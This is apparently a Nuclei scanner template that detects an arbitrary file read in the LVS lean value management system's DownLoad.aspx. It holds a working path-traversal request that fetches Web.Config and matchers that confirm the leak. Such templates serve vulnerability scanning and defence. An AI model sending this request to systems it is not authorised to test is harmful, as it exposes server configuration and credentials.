id: LVS-DownLoad-File-reading

info:
  name: LVS精益价值管理系统 DownLoad.aspx组件任意文件读取漏洞
  author: Unknown
  severity: medium
  description: LVS精益价值管理系统中的DownLoad.aspx组件存在任意文件读取漏洞。攻击者可通过构造恶意路径参数，读取服务器上的任意文件，可能导致敏感信息泄露。该漏洞允许远程攻击者通过路径穿越技术访问受限文件资源，影响系统数据安全性。
  tags: LVS精益价值管理

http:
- raw:
  - |
    GET /Business/DownLoad.aspx?p=UploadFile/../Web.Config HTTP/1.1
    Host: {{Hostname}}

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '<configuration>'
  - type: status
    status:
    - 200





